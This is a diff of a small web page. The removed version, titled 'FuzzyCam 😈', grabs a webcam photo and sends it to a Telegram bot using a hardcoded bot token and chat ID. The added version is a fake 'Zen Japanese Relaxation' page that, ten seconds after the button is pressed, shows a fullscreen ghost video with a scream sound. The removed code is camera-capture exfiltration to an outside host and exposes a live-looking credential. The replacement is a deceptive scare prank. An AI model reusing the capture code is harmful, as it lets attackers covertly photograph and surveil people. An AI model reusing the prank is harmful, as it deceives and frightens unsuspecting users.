@@ -1,119 +1,65 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>FuzzyCam 😈</title>
+  <meta charset="UTF-8">
+  <title>Zen Japanese Relaxation</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      margin: 0;
-      font-family: sans-serif;
       background-color: #111;
       color: white;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-
-    #progressBox {
-      background-color: #222;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px #000;
+      font-family: sans-serif;
       text-align: center;
-      position: absolute;
-      top: 40%;
+      padding-top: 20%;
+    }
+    #ghostContainer {
       display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: black;
+      z-index: 9999;
     }
-
-    .spinner {
-      margin: 10px auto;
-      border: 6px solid #ccc;
-      border-top: 6px solid #f39c12;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    #captureBtn {
-      padding: 15px 30px;
-      font-size: 18px;
-      border: none;
-      border-radius: 30px;
-      background-color: #f39c12;
-      color: white;
-      margin-top: 20px;
-      cursor: pointer;
-    }
-
-    #video, #canvas {
-      display: none;
+    #ghostVideo {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
     }
   </style>
 </head>
 <body>
+  <h1>🧘‍♂️ Japanese Zen Relaxation</h1>
+  <p>Take a deep breath... Calm your soul... 🌸</p>
+  <button id="startBtn">Start Relaxation</button>
 
-  <div id="progressBox">
-    <div class="spinner"></div>
-    <p>Processing image...</p>
+  <div id="ghostContainer">
+    <video id="ghostVideo" autoplay muted playsinline>
+      <source src="https://cdn.pixabay.com/video/2023/06/19/172563-832851487_large.mp4" type="video/mp4">
+    </video>
+    <audio id="screamAudio">
+      <source src="https://www.soundjay.com/human/sounds/scream-01.mp3" type="audio/mpeg">
+    </audio>
   </div>
 
-  <button id="captureBtn">📸 Capture & Send Photo</button>
-
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
-
   <script>
-    const botToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
-    const chatId = "8182050140";
+    const startBtn = document.getElementById('startBtn');
+    const ghostContainer = document.getElementById('ghostContainer');
+    const ghostVideo = document.getElementById('ghostVideo');
+    const screamAudio = document.getElementById('screamAudio');
 
-    async function captureAndSendPhoto() {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const context = canvas.getContext('2d');
-      const progressBox = document.getElementById('progressBox');
+    startBtn.addEventListener('click', () => {
+      startBtn.style.display = 'none';
 
-      try {
-        progressBox.style.display = 'block';
-
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-
-        await new Promise(resolve => setTimeout(resolve, 2000)); // Wait for cam
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        stream.getTracks().forEach(track => track.stop());
-
-        canvas.toBlob(async (blob) => {
-          const formData = new FormData();
-          formData.append('chat_id', chatId);
-          formData.append('photo', blob, 'photo.jpg');
-
-          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-          });
-
-          progressBox.style.display = 'none';
-          alert("❤️ Photo sent successfully 😈");
-        }, 'image/jpeg');
-      } catch (e) {
-        progressBox.style.display = 'none';
-        alert("❌ Camera error: " + e.message);
-      }
-    }
-
-    document.getElementById('captureBtn').onclick = captureAndSendPhoto;
+      // Wait 10 seconds then show ghost
+      setTimeout(() => {
+        ghostContainer.style.display = 'block';
+        ghostVideo.muted = false; // unmute for effect
+        ghostVideo.play();
+        screamAudio.play();
+      }, 10000);
+    });
   </script>
 </body>
 </html>
